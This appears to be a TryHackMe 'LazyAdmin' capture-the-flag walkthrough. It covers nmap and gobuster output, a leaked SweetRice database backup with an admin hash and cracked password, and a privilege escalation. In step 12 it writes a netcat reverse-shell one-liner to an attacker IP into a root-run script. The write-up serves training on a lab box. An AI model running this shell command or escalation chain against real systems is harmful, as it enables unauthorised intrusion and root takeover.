#   Tryhackme - LazyAdmin
##  Walkthrough by
```
Shaswata Saha
08-07-2023
5:35PM
```

##  Steps:
1.  Nmap Scan
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-08 08:09 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:09
Completed NSE at 08:09, 0.00s elapsed
Initiating NSE at 08:09
Completed NSE at 08:09, 0.00s elapsed
Initiating NSE at 08:09
Completed NSE at 08:09, 0.00s elapsed
Initiating Ping Scan at 08:09
Scanning 10.10.96.171 [2 ports]
Completed Ping Scan at 08:09, 0.35s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:09
Completed Parallel DNS resolution of 1 host. at 08:09, 0.20s elapsed
Initiating Connect Scan at 08:09
Scanning 10.10.96.171 [1000 ports]
Discovered open port 80/tcp on 10.10.96.171
Discovered open port 22/tcp on 10.10.96.171
Increasing send delay for 10.10.96.171 from 0 to 5 due to 35 out of 115 dropped probes since last increase.
Increasing send delay for 10.10.96.171 from 5 to 10 due to max_successful_tryno increase to 4
Connect Scan Timing: About 27.47% done; ETC: 08:11 (0:01:22 remaining)
Increasing send delay for 10.10.96.171 from 10 to 20 due to max_successful_tryno increase to 5
Connect Scan Timing: About 56.46% done; ETC: 08:12 (0:01:06 remaining)
Completed Connect Scan at 08:12, 148.80s elapsed (1000 total ports)
Initiating Service scan at 08:12
Scanning 2 services on 10.10.96.171
Completed Service scan at 08:12, 6.88s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.96.171.
Initiating NSE at 08:12
Completed NSE at 08:12, 23.13s elapsed
Initiating NSE at 08:12
Completed NSE at 08:12, 1.23s elapsed
Initiating NSE at 08:12
Completed NSE at 08:12, 0.00s elapsed
Nmap scan report for 10.10.96.171
Host is up (0.51s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 08:12
Completed NSE at 08:12, 0.00s elapsed
Initiating NSE at 08:12
Completed NSE at 08:12, 0.00s elapsed
Initiating NSE at 08:12
Completed NSE at 08:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.35 seconds

```

2.  Gobuster scan
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.96.171 -w Documents/gobuster-wordlist/dsstorewordlist.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.96.171
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/08 08:11:11 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.96.171/content/]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
Progress: 1828 / 1829 (99.95%)
===============================================================
2023/07/08 08:12:33 Finished
===============================================================

```
##  IP change = 10.10.232.113

3.  On gobuster scan inside /contents we went to the link 
```
http://10.10.232.113/content/inc/mysql_backup/
```

4.  After downloading file we get the md5 hash of pwd:
```bash
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',


  "admin" : "manager"
  "passwd" : "42f749ade7f9e195bf475f37a44cafcb" # MD5
  passwd: Password123

```

5.  We also find a login form with a more sophisticated wordlist:
```bash
http://10.10.232.113/content/as/    
```

6.  Now we are logged in...!

7.  We will now upload a file and listen through netcat for reverse shell.

8.  Once we get the reverse shell we will get the user.txt file

9.  For root.txt file we have to follow some steps:

10. Stabilize the shell:
```bash

```

11. We find /home/itguy/backup.pl to be vulnerable.. Then we run sudo -l to see all commands we can run as root.We find that we can run backup.pl as sudo without any password.Sadly we dont have the permissions to edit and write to backup.pl. Now if we cat backup.pl to see the contents inside the file, we find that it is simply running a file called copy.sh which is located in /etc directory.


12. Now if you run the command-

cat /etc/copy.sh you will be able to read what is inside copy.sh and we find that it is a netcat reverse shell.MOREOVER, we have write permission on copy.sh so we can edit and change the script inside it.

HERE IS OUR GAME PLAN! We will put a netcat reverse shell in copy.sh and then run backup.pl as sudo (which in turn will execute copy.sh as root) and give us a reverse shell.

```bash
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.28.202 9999 >/tmp/f" > /etc/copy.sh
```

13. 
```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```